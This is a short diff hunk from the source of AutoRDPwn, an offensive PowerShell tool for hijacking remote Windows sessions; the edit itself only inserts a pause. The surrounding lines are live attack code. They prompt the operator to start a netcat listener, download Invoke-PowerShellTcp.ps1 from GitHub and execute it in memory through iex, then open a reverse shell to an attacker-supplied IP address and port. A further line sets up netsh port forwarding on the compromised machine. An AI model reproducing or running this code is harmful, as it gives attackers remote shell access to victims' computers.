@@ -617,7 +617,7 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/ma
 if ($netcat -in 'remote'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
-Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1" -UseBasicParsing | iex ; Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport }}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
